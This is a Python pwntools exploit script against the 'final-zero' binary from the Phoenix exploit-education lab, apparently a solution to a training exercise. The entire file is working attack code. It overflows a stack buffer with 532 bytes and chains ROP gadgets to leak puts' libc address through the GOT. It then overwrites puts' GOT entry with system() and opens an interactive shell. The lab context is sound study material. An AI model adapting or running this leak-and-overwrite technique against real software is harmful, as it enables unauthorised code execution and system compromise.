#!/usr/bin/python

from pwn import *

p = process("/opt/phoenix/i486/final-zero")

def main():
	# Skips banner
	p.recvline()

	# call   0x80483f0 <puts@plt>
	puts_plt = 0x80483f0

	# final-zero : 0x8048f9d --> 0x2e006873 ('sh')
	sh = 0x8048f9d

	# 1095791425 found at offset: 532
	offset = "A" * 532

	# 08049968  00000407 R_386_JUMP_SLOT   00000000   puts
	puts_got = 0x08049968

	# 0x080485ac : pop ebp ; ret
	pop_ret = 0x080485ac
	
	# call   0x80483e0 <gets@plt>
	gets_plt = 0x80483e0
	
	# 08049960  00000107 R_386_JUMP_SLOT   00000000   printf
	printf_got = 0x08049960

	# To prevent confusion when creating payload	
	new_system_plt = puts_plt

	# Stage 1: leak
	buf = offset
	buf += p32(puts_plt)
	buf += p32(pop_ret)
	buf += p32(puts_got)
	
	# Stage 2: ovewrite puts_got 
	buf += p32(gets_plt)
	buf += p32(pop_ret) 
	buf += p32(puts_got)

	# Execute exploit
	buf += p32(new_system_plt)
	buf += '\x90' * 4
	buf += p32(sh)

	# 1st stage
	p.sendline(buf)
	leak = p.recv(4) # Only receives the real puts() addr

	# Debug purpose: dumpfile in hex for use with `hexdump`
	fname = "dumpfile"
	with open(fname, 'w') as f:
		f.write(leak)

	log.info("-----Stage 1-----")	
	log.info("Leak length: %d" % len(leak))

	puts_addr = u32(leak) # Unpacks address into its hex format 
	log.success("puts addr: 0x%x" % puts_addr)	
	log.success("puts got: 0x%x" % puts_got)

	# objdump -d /opt/phoenix/i486-linux-musl/lib/libc.so |grep "<puts>"
	# 0004b8ee <puts>:
	puts_offset = 0x0004b8ee

	libc_base = puts_addr - puts_offset
	log.success("libc base addr: 0x%x" % libc_base)

	# objdump -d /opt/phoenix/i486-linux-musl/lib/libc.so |grep "<system>"
	# 00040824 <system>:
	system_offset = 0x00040824
	system = libc_base + system_offset
	log.success("system addr: 0x%x" % system)

	p.sendline( p32(system) ) # Here, we overwrite puts_got with system()	
	log.info("-----Stage 2-----")
	log.warn("Overwrite puts_got with system")
	log.progress("Executing shell....")
	p.recvline() # Skips junk

	p.interactive() # Pass interaction back to user

if __name__ == "__main__":
	main()
